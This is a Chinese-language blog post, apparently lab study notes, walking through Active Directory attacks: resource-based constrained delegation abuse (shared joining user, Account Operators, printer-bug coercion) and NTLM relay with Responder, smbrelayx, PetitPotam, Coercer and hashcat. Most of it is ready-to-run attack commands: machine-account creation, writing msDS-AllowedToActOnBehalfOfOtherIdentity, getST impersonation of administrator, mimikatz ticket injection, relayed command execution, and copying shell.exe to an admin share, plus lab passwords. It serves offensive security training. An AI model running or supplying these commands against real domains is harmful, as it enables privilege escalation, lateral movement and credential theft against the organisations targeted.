<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc administrator.ccache</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203180252502.png" alt="image-20250203180252502"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203180300374.png" alt="image-20250203180300374"></p>
<p>然后尝试连接！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god.god.org\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203180330517.png" alt="image-20250203180330517"></p>
<h4 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h4><p>基于资源的约束委派(RBCD)是在Windows Server 2012中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。也就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。</p>
<p>所以核心就是谁或什么权限能修改msDS-AllowedToActOnBehalfOfOtherIdentity，找到能修改机器msDS-AllowedToActOnBehalfOfOtherIdentity这个属性值的权限或者用户。</p>
<p>非约束委派和约束委派都需要设置委派后才可能有安全问题，而这个基于资源的约束委派，设置委派的权限是机器自身的。</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155040211.png" alt="image-20250517155040211" style="zoom:80%;" />

<p>DATA机器</p>
<p>msDS-AllowedToActOnBehalfOfOtherIdentity  sid值</p>
<p>代表了sid对应的就能委派控制data机器</p>
<p>简单来说，就是攻击者如果能够在data机器上设置msDS-AllowedToActOnBehalfOfOtherIdentity属性为ServiceA，也就允许ServiceA利用s4u2self协议代表其他用户身份来访问data的话，那么我们就可以做到横向移动或者提权的操作了。</p>
<p>资源约束委派利用分类：</p>
<p>1、通过管理主机加入域的用户拿下主机</p>
<p>2、已知Acount Operators组用户拿下主机</p>
<p>3、结合HTLM Relay攻击拿下主机（CVE-2019-1040）</p>
<blockquote>
<p>dc 2012</p>
<p>web 2008  webadmin域用户加入到域</p>
<p>sql win7  webadmin域用户加入到域</p>
<p>webadmin用户加入了两台机器&#x3D;符合RBCD攻击条件</p>
<p>可以这样理解：获得web主机权限后，发现webadmin域用户加入了两台机器，控制一台权限之后，可以尝试修改另一台机器上的msDS-AllowedToActOnBehalfOfOtherIdentity属性。</p>
</blockquote>
<p>在此之前，我们做个小实验看看：</p>
<p>我们直接在机器上查询被域用户创建的机器账户列表</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155051784.png" alt="image-20250517155051784"></p>
<p>此时我们登陆的是dbadmin（域内的用户），发现DATA的和WEB的sid值一致。</p>
<p>接下来我们要退出域重新加域（本地管理员用户才行），做实验</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155059277.png" alt="image-20250517155059277"></p>
<p>退出域成功了，我们重新加域，换个名字加webadmin</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155106457.png" alt="image-20250517155106457"></p>
<p>再次查询被域用户创建的机器账户列表，sid就会不同。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205204519856.png" alt="image-20250205204519856"></p>
<p>总而言之，如果都采用webadmin加入到域，那么查询机器sid 就会一致。这其实就正式基于资源的约束委派的攻击条件</p>
<p>机器加入域的时候，账号可以登录十个机器</p>
<p>1.一个账号对应加一个机器（SID不一致）</p>
<p>2.一个账号对应加多个机器（SID一致）</p>
<p>第二个情况就是符合资源约束委派的攻击条件</p>
<p>测试判断能不能进行RBCD攻击的，查询SID是否一致来判断</p>
<h5 id="利用思路1：利用域用户主机加入"><a href="#利用思路1：利用域用户主机加入" class="headerlink" title="利用思路1：利用域用户主机加入"></a>利用思路1：利用域用户主机加入</h5><p>计算机加⼊域时，加⼊域的域⽤户被控后也将导致使用当前域用户加入的计算机受控。</p>
<p><strong>利用条件：</strong></p>
<p>1、允许创建机器账户</p>
<p>2、具有管理主机加入域的用户账户</p>
<p>这里的利用条件其实就是上文说的，有一个域用户同时加入了两台主机。</p>
<blockquote>
<p>dc 2012</p>
<p>web 2008 dbadmin域用户加入到域</p>
<p>sql win7  dbadmin域用户加入到域</p>
</blockquote>
<p>1.首先需要查询是否有利用条件：</p>
<p>查询被域用户创建的机器账户列表（可以理解为看域用户加入了哪些计算机）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell AdFind.exe -b &quot;DC=xiaodi,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369))&quot; cn mS-DS-CreatorSID</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205215219318.png" alt="image-20250205215219318"></p>
<p>根据查询出来的sid找出对应的用户名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell AdFind.exe -b &quot;DC=xiaodi,DC=local&quot; -f &quot;(&amp;(objectsid=S-1-5-21-1695257952-3088263962-2055235443-1104))&quot; objectclass cn dn</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205215232435.png" alt="image-20250205215232435"></p>
<p>刚好，这个dbadmin是被我们控制的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205215503354.png" alt="image-20250205215503354"></p>
<p>那么我们就可以尝试攻击DATA主机</p>
<p>2、开始利用新增机器账户</p>
<p>添加一个机器账户，用于申请票据</p>
<p>这里推荐用powershell，第一种第二种需要输入账号密码，还是明文，如果我们获取hash，那就用不了。系统大于2012我们得不到明文，那就白给了。。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用addcpmputer创建机器账户</span><br><span class="line">python addcomputer.py xiaodi8.com/web2016:Xiaodi12345 -method LDAPS -computer-name test01\$ -computer-pass Passw0rd -dc-ip 192.168.139.11</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用bloodyAD工具创建机器账户</span><br><span class="line">python bloodyAD.py -d redteam.lab -u web2016 -p &#x27;Xiaodi12345&#x27; --host 192.168.139.11 addComputer test01 &#x27;Passw0rd&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 使用PowerMad工具创建机器账户</span><br><span class="line">powershell Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line"></span><br><span class="line">#导入模块；新建机器账号名字叫serviceA，密码为123456</span><br><span class="line">powershell Import-Module .\Powermad.ps1;New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>

<p>我们使用powershell的这种，这里需要上传文件！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155155676.png" alt="image-20250517155155676"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205220013111.png" alt="image-20250205220013111"></p>
<p>同时我们也上传一个这个，后续会用到</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155220387.png" alt="image-20250517155220387" style="zoom:80%;" />

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205220525073.png" alt="image-20250205220525073"></p>
<p>然后我们看DC，确实多了一个机器账户</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155235686.png" alt="image-20250517155235686"></p>
<p>3、利用新增机器账户修改委派属性满足申请访问目标票款</p>
<p>修改目标主机的资源委派属性（data）</p>
<p>获取新增账户的objectsid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Import-Module .\PowerView.ps1;Get-NetComputer serviceA -Properties objectsid</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205221040294.png" alt="image-20250205221040294"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-1695257952-3088263962-2055235443-1604</span><br></pre></td></tr></table></figure>



<p>修改data主机委派属性：</p>
<p>将data的msds-allowedtoactonbehalfofotheridentity属性值修改成S-1-5-21-1695257952-3088263962-2055235443-1604</p>
<p>S-1-5-21-1695257952-3088263962-2055235443-1604对应serviceA机器</p>
<p>data -&gt; serviceA</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell import-module .\powerview.ps1;$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257952-3088263962-2055235443-1604)&quot;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer data| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>

<p>上述命令其实就是将data主机的委派属性改成serviceA机器账户的sid值  serviceA 123456</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205221415902.png" alt="image-20250205221415902"></p>
<p>那么命令执行后serviceA就能资源委派控制data，然后我们用serviceA上的票据去模拟访问data，就能拿到data的权限</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205221912662.png" alt="image-20250205221912662"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155304789.png" alt="image-20250517155304789"></p>
<p>以上操作是通过新建的serviceA来攻击DATA，那么为什么不直接用Web来攻击呢？？因为后面的攻击需要明文的账号密码，serviceA是我们自己创建的，是可控的，而Web的明文密码我们不一定知道</p>
<p>验证和清除委派属性：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell import-module .\powerview.ps1;Get-DomainComputer data -Properties msds-allowedtoactonbehalfofotheridentity</span><br><span class="line"></span><br><span class="line">powershell import-module .\powerview.ps1;Set-DomainObject data -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>



<p>4、利用修改后的属性申请目标请求票据后导入利用</p>
<p>利用serviceA申请访问data主机cifs服务票据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator</span><br></pre></td></tr></table></figure>

<p>data信任serviceA的资源委派。因为我们之前改了sid值，那么serviceA就可以去委派data了。</p>
<p>由于是python脚本，我们建立socks代理</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205223407022.png" alt="image-20250205223407022"></p>
<p>成功生成了票据文件。其实就是serviceA访问data生成的票据</p>
<p>导入票据到内存：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc administrator@cifs_data.xiaodi.local@XIAODI.LOCAL.ccache</span><br></pre></td></tr></table></figure>

<p>我们先事先dir一下看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205223631850.png" alt="image-20250205223631850"></p>
<p>然后导入票据到内存</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205223652804.png" alt="image-20250205223652804"></p>
<p>连接利用票据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\data.xiaodi.local\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250205223705070.png" alt="image-20250205223705070"></p>
<p>后面就是一样的操作了。</p>
<h5 id="利用思路2：Acount-Operators组"><a href="#利用思路2：Acount-Operators组" class="headerlink" title="利用思路2：Acount Operators组"></a>利用思路2：Acount Operators组</h5><p>首先说明一下环境，这里的环境跟上面不同了。</p>
<blockquote>
<p>dc 2012</p>
<p>web dbadmin域用户加入到域</p>
<p>sql win7  webadmin域用户加入到域</p>
</blockquote>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155335969.png" alt="image-20250517155335969" style="zoom:80%;" />

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155347537.png" alt="image-20250517155347537"></p>
<p>利用思路：</p>
<p>Acount Operators组成员可修改域内任意主机的msDS-AllowedToActOnBehalfOfOtherIdentity属性。(除DC)</p>
<p>环境配好了，接下来开始实验吧。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell AdFind.exe -b &quot;DC=xiaodi,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369))&quot; cn mS-DS-CreatorSID</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213163328688.png" alt="image-20250213163328688"></p>
<p>发现sid值不一致，那么利用思路1就不可行了！</p>
<p>但是！被控用户属于Account Operators组 ，不需要sid一致也可以进行rbcd攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询Acount Operators组成员：</span><br><span class="line">shell adfind.exe -h 192.168.3.33:389 -s subtree -b CN=&quot;Account Operators&quot;,CN=Builtin,DC=xiaodi,DC=local member</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213165020780.png" alt="image-20250213165020780"></p>
<p>出现这种情况，说明没有属于Account Operators组的，攻击条件不成立，接下来我们添加一下Account Operators组成员</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155407102.png" alt="image-20250517155407102"></p>
<p>然后我们再查询一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213170920237.png" alt="image-20250213170920237"></p>
<p>发现webadmin属于Account Operators组成员！那么我们就可以进行后续的rbcd攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询sid对应的用户名</span><br><span class="line">shell AdFind.exe -b &quot;DC=xiaodi,DC=local&quot; -f &quot;(&amp;(objectsid=S-1-5-21-1695257952-3088263962-2055235443-1602))&quot; objectclass cn dn</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213172526943.png" alt="image-20250213172526943"></p>
<p>接下来就是跟利用思路1一致了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 使用PowerMad工具创建机器账户</span><br><span class="line">powershell Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line"></span><br><span class="line">#导入模块；新建机器账号名字叫serviceB，密码为123456</span><br><span class="line">powershell Import-Module .\Powermad.ps1;New-MachineAccount -MachineAccount serviceB -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155541181.png" alt="image-20250517155541181"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213173115855.png" alt="image-20250213173115855"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213173122936.png" alt="image-20250213173122936"></p>
<p>发现成功添加</p>
<p>然后获取新增账户的objectsid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Import-Module .\PowerView.ps1;Get-NetComputer serviceB -Properties objectsid</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213173244633.png" alt="image-20250213173244633"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-1695257952-3088263962-2055235443-1605</span><br></pre></td></tr></table></figure>



<p>将data主机的委派属性改成serviceB机器账户的sid值，实现serviceB能资源委派控制data主机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell import-module .\powerview.ps1;$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257952-3088263962-2055235443-1605)&quot;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer data| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213173800317.png" alt="image-20250213173800317"></p>
<p>利用修改后的属性申请目标请求票据后导入利用</p>
<p>利用serviceB申请访问data主机cifs服务票据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceB\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator</span><br></pre></td></tr></table></figure>

<p>data信任serviceB的资源委派。因为我们之前改了sid值，那么serviceB就可以去委派data了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213173933531.png" alt="image-20250213173933531"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155618347.png" alt="image-20250517155618347"></p>
<p>然后我们导入票据到内存，利用即可。</p>
<p>导入之前我们先尝试访问一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\data.xiaodi.local\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213174205903.png" alt="image-20250213174205903"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc administrator@cifs_data.xiaodi.local@XIAODI.LOCAL.ccache</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213174301061.png" alt="image-20250213174301061"></p>
<p>然后我们再访问一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250213174318592.png" alt="image-20250213174318592"></p>
<p>拿下！</p>
<h5 id="利用思路3：CVE结合NTLMRelay"><a href="#利用思路3：CVE结合NTLMRelay" class="headerlink" title="利用思路3：CVE结合NTLMRelay"></a>利用思路3：CVE结合NTLMRelay</h5><p>如果被控用户加入多台主机、被控用户在Acount Operators组，两个条件都不成立，那就用这种了。</p>
<p>利用思路：</p>
<p>绕过NTLM MIC校验+打印机漏洞+NTLM Relay+基于资源的约束性委派组合攻击</p>
<p>利用条件：</p>
<p>1、能创建机器账户</p>
<p>2、目标开启打印机服务</p>
<p>利用过程：</p>
<p>1、监听：</p>
<p>使用ntlmrelayx工具（后续讲到中继重放攻击等）</p>
<p>这里讲一下我们的环境，以下命令是在kali上执行的，直接在kali上放了个3网段的网卡，不然正常情况下需要代理转发。有点麻烦，这里只是浅尝辄止一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth1 -wd</span><br></pre></td></tr></table></figure>

<p>命令执行后开始监听eth1这张网卡上的数据</p>
<p>2、利用打印机漏洞（CVE-2019-1040）让目标3.33强制访问3.143</p>
<p>下载：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python printerbug.py xiaodi.local/webadmin:admin!@#45@192.168.3.33 192.168.3.143</span><br><span class="line">#此处的webadmin账号密码输不输取决于操作系统版本，2016以下不用，反之则要。</span><br><span class="line">#这串代码的作用其实就是让3.33去访问3.143</span><br></pre></td></tr></table></figure>





<h3 id="NTLM中继攻击"><a href="#NTLM中继攻击" class="headerlink" title="NTLM中继攻击"></a>NTLM中继攻击</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/O-hYgpryXPJ-fCh8Nqggww">https://mp.weixin.qq.com/s/O-hYgpryXPJ-fCh8Nqggww</a></p>
<p>NTLM Relay其实严格意义上并不能叫NTLM Relay，而是应该叫Net-NTLM Relay。它是发生在NTLM认证的第三步，在Type3 Response消息中存在Net-NTLM Hash，当攻击者获得了Net-NTLM Hash后，可以进行中间人攻击，重放Net-NTLM Hash，这种攻击手法也就是大家所说的NTLM Relay（NTLM中继）攻击。NTLM Relay Attack（NTLM中继攻击）指的是强制目标服务器、目标用户使用LM Hash、NTLM Hash对攻击者的服务器进行认证，攻击者将该认证中继至其它目标服务器中（域控等），根据目标域的防护等级可以在活动目录域中进行横向移动或权限提升。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250218154937892.png" alt="image-20250218154937892"></p>
<blockquote>
<p>第一步是捕获Net-NTLM Hash</p>
<p>第二步是重放Net-NTLM Hash</p>
<p>第二步是爆破Net-NTLM Hash</p>
</blockquote>
<h4 id="捕获"><a href="#捕获" class="headerlink" title="捕获"></a>捕获</h4><p><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#开启对eth1网卡的监听</span><br><span class="line">responder -I eth1</span><br></pre></td></tr></table></figure>

<p>然后用3.32主机去主动访问攻击机演示一下。一般用社工钓鱼的方法！</p>
<p>这里我们直接给kali一个3网段，也就是192.168.3.143，不然的话还要代理啥的，这里只是演示一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.143</span><br><span class="line">会用自带的账号密码去匹对</span><br></pre></td></tr></table></figure>

<p>然后responder就会监听到3.32主机的账号密码。</p>
<h4 id="重放"><a href="#重放" class="headerlink" title="重放"></a>重放</h4><p>利用：smbrelayx.py（ntlmrelayx.py）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h 192.168.3.32 -c whoami</span><br></pre></td></tr></table></figure>

<p>执行后，192.168.3.31去执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.143</span><br></pre></td></tr></table></figure>

<p>执行完毕后py处会出现响应，给出hash值，同时执行了whoami命令并回显。</p>
<blockquote>
<ol>
<li>192.168.3.31去将自己的账号密码去比对192.168.3.143</li>
<li>192.168.3.143做了一个中继重放192.168.3.32 并执行whoami</li>
<li>192.168.3.31和192.168.3.32机器密码一致  比对成功！</li>
</ol>
</blockquote>
<p>此时如果密码不一致，会重放失败，可以暴力破解从而进行后续的渗透。</p>
<p>截取到的是192.168.3.31也就是web主机的账号密码，爆破出来的就是web主机的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt pass.txt</span><br></pre></td></tr></table></figure>





<p>windows认证过程：</p>
<p>先用本机的用户密码去认证 成功 就不需要验证</p>
<p>不对 输入。</p>
<p>以下是web主机和sql主机都用administrator登录，密码都为admin!@#45的场景。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155649009.png" alt="image-20250517155649009"></p>
<p>以下是web主机用webadmin用户登录，sql主机用administrator用户登陆的场景。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155656318.png" alt="image-20250517155656318"></p>
<p>这种方法适用于你拿到了web主机，但是不知道账号密码，如果sql主机登录的账号密码和web主机拿到的权限的账号一样且密码一样的情况下，你不需要知道密码就能横向移动拿下sql主机权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy c:\shell.exe \\192.168.3.32\c$</span><br></pre></td></tr></table></figure>





<p>如何抓到数据：</p>
<p>目录主机要访问监听主机</p>
<p>这时就要用到钓鱼的方法（被动）：打开文件 执行什么命令 访问网站等</p>
<p><strong>同时我们也有强制的方法！</strong>（主动）：这时我们可以联想到非约束委派中的利用思路2：结合打印机漏洞。我们主动让对面访问我们的监听主机。</p>
<ul>
<li><p>利用打印机漏洞（printerbug.py）</p>
</li>
<li><p>利用PetitPotam漏洞（PetitPotam.py）</p>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">https://github.com/topotam/PetitPotam</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a></p>
<p>自动化项目：<a target="_blank" rel="noopener" href="https://github.com/p0dalirius/Coercer">https://github.com/p0dalirius/Coercer</a></p>
<p>直接使用自动化项目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python Coercer.py scan -t 192.168.3.21 -u webadmin -p &#x27;admin!@#45&#x27; -d god.org</span><br><span class="line">#判断域控上是否有这种漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python Coercer.py coerce -l 192.168.3.143 -t 192.168.3.33 -u webadmin -p &#x27;admin!@#45&#x27; -d xiaodi.local -always-continue</span><br><span class="line">#强制触发，让3.33访问3.143</span><br></pre></td></tr></table></figure>

<p>同时3.143开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth1</span><br></pre></td></tr></table></figure>



<p>使用krbrelayx项目：</p>
<p>kali上先使用smbrelayx.py脚本进行监听转发：</p>
<p>3.143执行重放利用 中继到3.22执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h 192.168.3.22 -c whoami</span><br></pre></td></tr></table></figure>

<p>然后强制访问</p>
<p>printerbug.py（&gt;&#x3D;2012）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python printerbug.py xiaodi.local/administrator:Xiaodi12345@192.168.3.33 192.168.3.143</span><br><span class="line">python printerbug.py ./administrator:admin!@#45@192.168.3.33 192.168.3.143</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用域用户administrator强制让3.33访问3.143</span><br><span class="line">python PetitPotam.py -d xiaodi.local -u administrator -p Xiaodi12345 192.168.3.33 192.168.3.143</span><br><span class="line">用本地用户administrator强制让3.33访问3.143</span><br><span class="line">python PetitPotam.py -d . -u administrator -p &#x27;admin!@#45&#x27; 192.168.3.33 192.168.3.143</span><br></pre></td></tr></table></figure>



<p>做到这里，我们可能会有一些疑问。既然此处需要给出账号密码，那么我们用最开始的wmi、ipc等横向移动它不香吗？？</p>
<p>这里没有权限的限制，甚至不需要上线cs！多了一种手法！！！！</p>
<p>抓到的数据：</p>
